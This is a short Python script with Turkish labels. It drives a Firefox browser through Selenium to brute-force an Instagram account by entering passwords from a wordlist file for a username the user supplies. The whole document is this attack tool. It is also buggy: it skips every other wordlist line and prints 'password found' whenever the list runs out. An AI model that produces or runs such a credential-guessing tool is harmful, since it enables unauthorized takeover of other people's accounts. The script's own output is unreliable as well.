from selenium import webdriver
import os
import time

def brute_force():
        user=input("hedefin kullanıcı adı: ")
        tarayıcı=webdriver.Firefox()
        time.sleep(3)
        hedef=tarayıcı.get("https://www.instagram.com/")
        time.sleep(3)
        wordlist=open("wordlist.txt","r")
        for atak in wordlist:
                username=tarayıcı.find_element_by_name("username")
                password=tarayıcı.find_element_by_name("password")
                giriş_buton=tarayıcı.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/div[4]/button/div')
                satır=wordlist.readline()
                username.send_keys(user)
                password.send_keys(satır)
                print("denenen şifre: ",satır)
                giriş_buton.click()
                time.sleep(3)
                tarayıcı.refresh()
                time.sleep(4)
        else:
                print("Şifre bulundu(yada wordlist'iniz bitti) : ",satır)
brute_force()


                
